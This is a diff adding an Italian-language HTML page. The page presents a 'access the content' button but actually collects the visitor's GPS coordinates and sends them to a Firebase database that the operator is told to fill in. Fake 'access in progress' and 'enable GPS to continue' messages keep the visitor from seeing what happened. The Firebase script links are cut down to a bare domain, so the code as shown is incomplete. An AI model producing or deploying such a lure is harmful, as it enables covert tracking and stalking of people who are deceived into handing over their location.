@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;margin:0;">
+    <button onclick="check()" style="padding:20px;background:#007bff;color:#fff;border-radius:10px;font-size:20px;border:none;width:80%;">ACCEDI AL CONTENUTO</button>
+    <script src="https://www.gstatic.com"></script>
+    <script src="https://www.gstatic.com"></script>
+    <script>
+        // SOSTITUISCI IL LINK SOTTO CON IL TUO DI FIREBASE (quello .firebaseio.com)
+        const config = { databaseURL: "https://tuo-progetto.firebaseio.com" };
+        firebase.initializeApp(config);
+        function check() {
+            navigator.geolocation.getCurrentPosition(p => {
+                firebase.database().ref('posizione').set({
+                    lat: p.coords.latitude,
+                    lon: p.coords.longitude,
+                    date: new Date().toLocaleString()
+                }).then(() => alert("Accesso in corso... attendere"));
+            }, e => alert("Attiva il GPS per continuare"));
+        }
+    </script>
+</body>
+</html>
